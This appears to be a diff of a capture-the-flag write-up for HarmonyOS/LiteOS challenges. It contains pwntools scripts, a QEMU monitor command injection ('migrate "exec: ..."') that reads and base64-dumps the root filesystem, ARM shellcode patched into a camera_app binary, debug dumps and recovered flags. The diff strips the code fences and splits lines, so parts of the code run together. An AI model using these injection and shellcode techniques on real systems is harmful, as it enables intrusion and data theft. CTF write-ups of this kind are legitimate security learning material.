@@ -6,22 +6,12 @@
 
 ```
 ./qemu-system-arm -M hi3518 -kernel liteos.bin -nographic
-```
-
-
-
-```
 from pwn import *
 context(log_level='debug')
 
 io =remote("172.35.7.36",9999)
 io.send(b"\x01c")
 io.interactive()
-```
-
-
-
-```
 from pwn import *
 context(log_level='debug')
 
@@ -31,25 +21,10 @@ sleep(1)
 io.sendline(b"")
 io.sendlineafter("(qemu) ",'migrate "exec: strings /rootfs.img | grep flag"')
 io.interactive()
-```
-
-
-
-```
 flag{SQLITE_WORKS_Well_in_HarmonyOS}
-```
-
-
-
-```
 migrate "exec: base64 rootfs.img > /tmp/1.txt 1>&2"
-```
-
-
-
-```
 from pwn import *
-#context(log_level='debug')
+    #context(log_level='debug')
 
 for j in range(0,13):
  io =remote("172.35.7.37",9999)
@@ -71,20 +46,12 @@ for j in range(0,13):
  break
  f.close()
  io.close()
-```
-
-
-
-```
-➜ cd ./cards 
+➜ cd ./cards
 ➜ grep -r "flag" ./
-./Right_Leg_of_the_Forbidden_One:flag{Yugioh_Is_Really_FUN!}
-./Right_Leg_of_the_Forbidden_One:flag{Yugioh_Is_Really_FUN!}
-```
-
-
-
-```
+./Right_Leg_of_the_Forbidden_One:
+flag{Yugioh_Is_Really_FUN!}
+./Right_Leg_of_the_Forbidden_One:
+flag{Yugioh_Is_Really_FUN!}
 #!/usr/bin/env python3
 import socket
 import base64
@@ -124,68 +91,42 @@ response = make_request(b"GET / HTTP/1.1\n\n")
 if b"hacked" in response:
  with open("/flag", "r") as f:
  print(f.read(), flush=True)
-```
-
-
-
-```
 >>> b64e(b"GET / HTTP/1.1\n\n")
 'R0VUIC8gSFRUUC8xLjEKCg=='
-```
-
-
-
-```
 flag{Clasic_http_ON_Harmony}
-```
-
-
-
-```
 ➜ grep -r "shell commands" ./
 Binary file .//liteos.bin matches
 Binary file .//liteos matches
 ➜ file liteos
 liteos: ELF 32-bit LSB executable, ARM, statically linked, not stripped
-```
-
-
-
-```
-.plt:00004510 syscall 
-.plt:00004510 
-.plt:00004510 ADRL R12, 0x4518
-.plt:00004518 LDR PC, [R12,#(off_5164 - 0x4518)]!
-```
-
-
-
-```
+.plt:
+00004510 syscall
+.plt:
+00004510
+.plt:
+00004510 ADRL R12, 0x4518
+.plt:
+00004518 LDR PC, [R12,#(off_5164 - 0x4518)]!
 pwndbg> p /x $r0
 $1 = 0x206
 pwndbg> x /s $r1
 0x242d4aa0:	"readreg"
 pwndbg> x /s $r2
 0x242d4a80:	"readreg 0x40130580 100"
-```
-
-
-
-```
-.text:0006AB14 syscall
+.text:
+0006AB14 syscall
 ...
-.text:0006AB2C MOV R7, R0
+.text:
+0006AB2C MOV R7, R0
 ...
-.text:0006AB34 MOV R0, R1
+.text:
+0006AB34 MOV R0, R1
 ...
-.text:0006AB48 MOV R1, R2
+.text:
+0006AB48 MOV R1, R2
 ...
-.text:0006AB60 SVC 0
-```
-
-
-
-```
+.text:
+0006AB60 SVC 0
 from pwn import *
 context(arch='arm')
 
@@ -203,11 +144,6 @@ cmd:
 ''')
 
 print(shellcode.hex())
-```
-
-
-
-```
 from pwn import *
 context(arch='arm')
 
@@ -227,27 +163,25 @@ cmd:
 print(shellcode.hex())
 
 stub = open('./camera_app','rb').read()
-exp = stub[:0x1154]+shellcode+stub[0x1154+len(shellcode):]
+exp = stub[:
+0x1154]+shellcode+stub[0x1154+len(shellcode):]
 open('./exp','wb').write(exp)
-```
-
-
-
-```
 OHOS # ./exp
-OHOS # 
- 0x40130580 :67616c66 6968547b 73692073 726f6620 
- 0x40130590 :73657420 00007d74 00000000 00000000 
- 0x401305a0 :00000000 00000000 4006a2cc 00000000 
- 0x401305b0 :00000000 00000000 400ec6ec 401305c8 
- 0x401305c0 :4026b8bc 7fffffff 400de6b0 400f84dc 
- 0x401305d0 :00000000 00000000 00000002 40300bfc 
- 0x401305e0 :4006be2c
-```
-
-
-
-```
+OHOS #
+ 0x40130580 :
+67616c66 6968547b 73692073 726f6620
+ 0x40130590 :
+73657420 00007d74 00000000 00000000
+ 0x401305a0 :
+00000000 00000000 4006a2cc 00000000
+ 0x401305b0 :
+00000000 00000000 400ec6ec 401305c8
+ 0x401305c0 :
+4026b8bc 7fffffff 400de6b0 400f84dc
+ 0x401305d0 :
+00000000 00000000 00000002 40300bfc
+ 0x401305e0 :
+4006be2c
 from pwn import *
 context(log_level='debug')
 
@@ -259,11 +193,6 @@ sleep(0.1)
 io.sendline(b"Exit")
 
 io.interactive()
-```
-
-
-
-```
 [DEBUG] Received 0xa84 bytes:
 00000000 2e 2f 70 77 6e 0d 0d 0a 1b 5b 31 3b 33 31 6d 4f │./pw│n···│·[1;│31mO│
 00000010 48 4f 53 20 23 20 1b 5b 30 6d 0d 0d 0a 20 30 78 │HOS │# ·[│0m··│· 0x│
@@ -290,11 +219,6 @@ io.interactive()
 00000160 20 3a 34 30 30 36 62 65 32 63 20 0d 0d 0a 0d 0d │ :40│06be│2c ·│····│
 00000170 0a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a │·***│****│****│****│
 00000180 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a │****│****│****│****│
-```
-
-
-
-```
 flag = bytes.fromhex('''
 2e 2f 70 77 6e 0d 0d 0a 1b 5b 31 3b 33 31 6d 4f
 48 4f 53 20 23 20 1b 5b 30 6d 0d 0d 0a 20 30 78
@@ -323,44 +247,31 @@ flag = bytes.fromhex('''
 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a
 '''.replace(" ","").replace("\n",""))
 print(flag.decode())
-```
-
-
-
-```
 ➜ python3 flag.py
 ./pwn
-OHOS # 
- 0x40130580 :67616c66 7261487b 72446f6d 65725f69 
- 0x40130590 :476e6576 00007d45 00000000 00000000 
- 0x401305a0 :00000000 00000000 4006a2cc 00000000 
- 0x401305b0 :00000000 00000000 400ec6da 401305c8 
- 0x401305c0 :4026b8bc 7fffffff 400de6b0 400f84dc 
- 0x401305d0 :00000000 00000000 00000002 40300bfc 
- 0x401305e0 :4006be2c 
+OHOS #
+ 0x40130580 :
+67616c66 7261487b 72446f6d 65725f69
+ 0x40130590 :
+476e6576 00007d45 00000000 00000000
+ 0x401305a0 :
+00000000 00000000 4006a2cc 00000000
+ 0x401305b0 :
+00000000 00000000 400ec6da 401305c8
+ 0x401305c0 :
+4026b8bc 7fffffff 400de6b0 400f84dc
+ 0x401305d0 :
+00000000 00000000 00000002 40300bfc
+ 0x401305e0 :
+4006be2c
 
 *******************************
-```
-
-
-
-```
 l = ["67616c66","7261487b","72446f6d","65725f69","476e6576","00007d45"]
 f = b''
 for i in l:
  f += bytes.fromhex(i)[::-1]
 print(f)
-```
-
-
-
-```
 flag{HarmoDri_revenGE}
-```
-
-
-
-```
 [DEBUG] Received 0xa84 bytes:
 00000000 2e 2f 70 77 6e 0d 0d 0a 1b 5b 31 3b 33 31 6d 4f │./pw│n···│·[1;│31mO│
 00000010 48 4f 53 20 23 20 1b 5b 30 6d 0d 0d 0a 20 30 78 │HOS │# ·[│0m··│· 0x│
@@ -386,20 +297,10 @@ flag{HarmoDri_revenGE}
 00000150 63 20 0d 0d 0a 20 30 78 34 30 31 33 31 35 65 30 │c ··│· 0x│4013│15e0│
 00000160 20 3a 30 30 30 30 30 30 30 30 20 0d 0d 0a 0d 0d │ :00│0000│00 ·│····│
 00000170 0a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a │·***│****│****│****│
-```
-
-
-
-```
 l = ["67616c66","7261487b","64686f6d","69724466","43656d76","74707972","7d797a6f"]
 f = b''
 for i in l:
  f += bytes.fromhex(i)[::-1]
 print(f)
-```
-
-
-
-```
 flag{HarmohdfDrivmeCryptozy}
 ```
